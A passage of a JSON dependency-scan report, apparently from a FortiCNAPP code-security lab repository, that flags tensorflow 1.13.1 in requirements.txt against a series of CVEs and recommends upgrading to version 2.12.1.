            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41215 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41215](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41215)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e88d0bcf58f17f993f5ecac9c66e3862e1aa3536"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41217",
          "ruleIndex": 255,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41217 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41217](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41217)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "4c4e45e49a97b5f08f1be68c443411f792c92059"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41225",
          "ruleIndex": 256,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41225 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41225](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41225)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "44ee3e873823471059d7c07a1178d95684bda368"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41204",
          "ruleIndex": 257,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41204 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41204](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41204)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "81f4359ed67f42ad5fc3e1c209cec42f69582375"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41200",
          "ruleIndex": 258,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41200 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41200](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41200)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "5fd697ce8ef42b60ad7bd554a9650413ecf927ad"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41213",
          "ruleIndex": 259,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41213 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41213](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41213)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "2e7afb93da4d0c907b687739ae4500163752628b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41212",
          "ruleIndex": 260,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41212 (severity: high, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41212](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41212)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "174d377f5946584fe0dcc3164c8e29152d1fda43"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41224",
          "ruleIndex": 261,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41224 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41224](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41224)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7046c939235542a48a4438195bccedf23083c89a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41201",
          "ruleIndex": 262,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41201 (severity: high, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41201](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41201)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "9e19a2948d5d0b08590897b4e7bcab817420b0c3"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41197",
          "ruleIndex": 263,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41197 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41197](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41197)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a22603d8813f220bc9dbdc9fd294f319a05b5d30"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41228",
          "ruleIndex": 264,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41228 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41228)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "8a505e125f9f5a424fa548e56c889cad909407d8"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41209",
          "ruleIndex": 265,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41209 (severity: medium, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41209](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41209)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "bc9fe7126ce69c8b4f44158d201a9a5cf0538bb8"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-41219",
          "ruleIndex": 266,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-41219 (severity: high, fixed in 2.6.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-41219](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41219)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "6dc98db3cc1b2e39a959edaca451c1b08a43630b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23568",
          "ruleIndex": 267,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23568 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23568](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23568)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "f1c39f93943dbb06da81240c4207fab60a35aab0"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23562",
          "ruleIndex": 268,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23562 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23562](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23562)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "24b089920b417b9291f83fa99209c1f94259fe57"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-23559",
          "ruleIndex": 269,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2022-23559 (severity: high, fixed in 2.7.0)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2022-23559](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23559)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "1ce29b0b427fdde0e24364e8e60297dd286b043b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2022-21740",
          "ruleIndex": 270,
          "level": "error",
          "message": {
